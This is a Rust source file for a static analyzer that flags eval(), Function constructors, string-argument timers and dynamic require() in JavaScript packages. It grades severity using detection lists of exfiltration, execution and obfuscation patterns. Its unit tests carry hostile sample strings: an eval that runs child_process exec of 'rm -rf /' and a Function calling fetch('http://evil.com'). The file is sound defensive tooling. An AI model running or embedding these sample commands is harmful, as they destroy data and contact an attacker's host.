use aho_corasick::AhoCorasick;
use lazy_static::lazy_static;

use crate::ast::{walk_ast_filtered, ArgInfo, AstVisitor, CallInfo, NodeInterest, VariableMap};
use crate::util::LineIndex;

use super::{FileAnalyzer, FileContext, Issue, Severity};

const SAFE_FUNCTION_PATTERNS: &[&str] = &[
  "return this",
  "return function",
  "use strict",
  "return arguments",
  "return obj",
  "return value",
  "return result",
];

const SUSPICIOUS_PATTERNS: &[&str] = &[
  // URL schemes that could indicate data exfiltration
  "://",     // Catches http://, https://, ftp://, ws://, wss://, etc.
  "file://", // Local file access
  "data:",   // Data URLs (can embed code)
  // Code execution
  "eval(",
  "require(",
  "process.",
  "child_process",
  "fs.",
  "Buffer.",
  "exec(",
  "spawn(",
  "fetch(",
  "XMLHttpRequest",
  "WebSocket",
  // Obfuscation patterns
  "\\x",
  "\\u00",
  "fromCharCode",
  "atob(",
  "btoa(",
];

lazy_static! {
  static ref QUICK_CHECK: AhoCorasick =
    AhoCorasick::new(["eval(", "new Function", "Function(", "setTimeout(\"", "setInterval(\""])
      .unwrap();
}

pub struct EvalAnalyzer;

struct EvalVisitor<'a> {
  issues: Vec<Issue>,
  analyzer_name: &'static str,
  file_path: &'a str,
  package_name: Option<&'a str>,
  line_index: LineIndex,
  variable_map: &'a VariableMap,
}

impl EvalVisitor<'_> {
  fn get_severity_for_content(&self, content: &str) -> Severity {
    let content_lower = content.to_lowercase();

    for pattern in SUSPICIOUS_PATTERNS {
      if content_lower.contains(&pattern.to_lowercase()) {
        return Severity::Critical;
      }
    }

    for pattern in SAFE_FUNCTION_PATTERNS {
      if content_lower.contains(pattern) {
        return Severity::Medium;
      }
    }

    if content.len() < 50 && !content.contains(';') {
      return Severity::Medium;
    }

    Severity::High
  }

  fn resolve_arg(&self, arg: &ArgInfo) -> Option<String> {
    if let Some(resolved) = self.variable_map.resolve_arg(arg) {
      return Some(resolved);
    }
    match arg {
      ArgInfo::StringLiteral(s) | ArgInfo::TemplateLiteral(s) => Some(s.clone()),
      _ => None,
    }
  }
}

impl AstVisitor for EvalVisitor<'_> {
  fn visit_call(&mut self, call: &CallInfo) {
    if let Some(ref callee) = call.callee_name {
      if callee == "eval" {
        // Single issue for eval, severity depends on first arg content when available
        let line = call.line.max(1);

        let severity = if let Some(first_arg) = call.arguments.first() {
          if let Some(content) = self.resolve_arg(first_arg) {
            self.get_severity_for_content(&content)
          } else {
            Severity::Critical
          }
        } else {
          Severity::Critical
        };

        let message = "Use of eval() detected. This can execute arbitrary code.";

        self.issues.push(
          Issue::new(self.analyzer_name, message.to_string(), severity, self.file_path.to_string())
            .with_package_name(self.package_name.unwrap_or("unknown"))
            .with_line(line)
            .with_code(self.line_index.get_line(line)),
        );
      }

      // Function constructor: either `Function(...)` or `new Function(...)`
      if callee == "Function" {
        let line = call.line.max(1);
        let severity = if let Some(first_arg) = call.arguments.first() {
          if let Some(content) = self.resolve_arg(first_arg) {
            self.get_severity_for_content(&content)
          } else {
            Severity::High
          }
        } else {
          Severity::Medium
        };

        let message = "Use of Function() constructor detected. This can execute arbitrary code.";

        self.issues.push(
          Issue::new(self.analyzer_name, message.to_string(), severity, self.file_path.to_string())
            .with_package_name(self.package_name.unwrap_or("unknown"))
            .with_line(line)
            .with_code(self.line_index.get_line(line)),
        );

        // Do not emit a secondary message for string arg; the single Function() constructor
        // issue above is sufficient and matches test expectations.
      }

      // setTimeout / setInterval with string argument should be flagged
      if callee == "setTimeout" || callee == "setInterval" {
        if let Some(ArgInfo::StringLiteral(_)) = call.arguments.first() {
          let line = call.line.max(1);
          let message =
            format!("Use of {} with string argument detected. Use function instead.", callee);
          self.issues.push(
            Issue::new(self.analyzer_name, message, Severity::High, self.file_path.to_string())
              .with_package_name(self.package_name.unwrap_or("unknown"))
              .with_line(line)
              .with_code(self.line_index.get_line(line)),
          );
        }
      }

      if callee == "require" && !call.arguments.is_empty() {
        match &call.arguments[0] {
          ArgInfo::StringLiteral(_) => {
            // Static require - safe
          }
          ArgInfo::Identifier(_) | ArgInfo::BinaryExpr | ArgInfo::TemplateLiteral(_) => {
            let line = call.line.max(1);
            let message = "Dynamic require() detected. Module path determined at runtime.";

            self.issues.push(
              Issue::new(
                self.analyzer_name,
                message.to_string(),
                Severity::High,
                self.file_path.to_string(),
              )
              .with_package_name(self.package_name.unwrap_or("unknown"))
              .with_line(line)
              .with_code(self.line_index.get_line(line)),
            );
          }
          _ => {}
        }
      }
    }
  }
}

impl FileAnalyzer for EvalAnalyzer {
  fn name(&self) -> &'static str {
    "eval"
  }

  fn uses_ast(&self) -> bool {
    true
  }

  fn analyze(&self, context: &FileContext) -> Vec<Issue> {
    // Quick check - skip if no dangerous patterns found
    if !QUICK_CHECK.is_match(context.source) {
      return vec![];
    }

    // Get variable map from parsed AST for data flow analysis
    let empty_map = VariableMap::default();
    let variable_map = context.parsed_ast.map(|ast| &ast.variable_map).unwrap_or(&empty_map);

    let mut visitor = EvalVisitor {
      issues: vec![],
      analyzer_name: self.name(),
      file_path: context.file_path.to_str().unwrap_or(""),
      package_name: context.package_name,
      line_index: LineIndex::new(context.source),
      variable_map,
    };

    let interest = NodeInterest::none().with_calls();
    walk_ast_filtered(context.parsed_ast, context.source, &mut visitor, interest);

    visitor.issues
  }
}

#[cfg(test)]
mod tests {
  use super::*;
  use std::path::PathBuf;

  #[test]
  fn test_detects_eval_with_simple_content() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"eval("console.log('hello')");"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    // Simple content is medium severity
    assert_eq!(issues[0].severity, Severity::Medium);
  }

  #[test]
  fn test_eval_with_suspicious_content_is_critical() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"eval("require('child_process').exec('rm -rf /')");"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0].severity, Severity::Critical);
  }

  #[test]
  fn test_function_constructor_return_this_is_medium() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"new Function("return this")();"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    // "return this" is a common safe pattern
    assert_eq!(issues[0].severity, Severity::Medium);
  }

  #[test]
  fn test_function_constructor_with_fetch_is_critical() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"new Function("fetch('http://evil.com')")();"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0].severity, Severity::Critical);
  }

  #[test]
  fn test_ignores_safe_require() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"const fs = require('fs');"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(issues.is_empty());
  }

  #[test]
  fn test_settimeout_with_string_is_detected() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"setTimeout("alert('hi')", 1000);"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    assert!(issues[0].message.contains("setTimeout"));
  }

  #[test]
  fn test_settimeout_with_function_is_safe() {
    let analyzer = EvalAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"setTimeout(() => console.log('hi'), 1000);"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
      parsed_ast: None,
    };
    let issues = analyzer.analyze(&context);

    assert!(issues.is_empty());
  }
}
